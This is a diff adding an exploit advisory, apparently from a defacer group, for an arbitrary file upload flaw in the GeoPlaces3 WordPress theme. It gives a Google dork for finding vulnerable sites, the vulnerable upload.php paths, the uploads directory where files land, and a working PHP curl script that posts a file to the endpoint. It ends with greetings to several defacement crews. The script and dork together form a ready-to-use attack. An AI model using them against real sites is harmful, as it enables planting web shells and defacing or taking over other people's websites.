@@ -1,0 +1,38 @@
+##################################################################################
+
+# Description : Wordpress Themes GeoPlaces3 - Arbitrary File Upload vulnerbility
+# Google Dork: inurl:/wp-content/themes/GeoPlaces3/
+# Date: 23 August 2015
+# Vendor Homepage: http://templatic.com/app-themes/geo-places-city-directory-wordpress-theme
+# Tested on: Win 7 & Win 8.1
+# Author: Mdn_Newbie | Gantengers Crew 
+# https://forum.gantengers-crew.org/
+
+##################################################################################
+
+Exploit : wp-content/themes/GeoPlaces3/library/includes/upload.php
+	  wp-content/themes/GeoPlaces3/library/includes/upload_3feb.php
+
+Path 	: /wp-content/uploads/tmp/
+
+
+<?php
+ 
+$uploadfile="m.jpg";
+$ch = 
+curl_init("https://server/wp-content/themes/GeoPlaces3/library/includes/upload.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+ 
+?>
+
+
+
+WE ARE : SultanHaikal - d3b~X - Brian Kamikaze - Coupdegrace - Mdn_newbie - Index Php 
+
+GREETS TO: Gantengers Crew - Indonesian Defacer - Indonesian Cyber Army - Defacer Tersakiti Team - Suram Crew - Surabaya BlackHat - AND All Moeslim Defacer
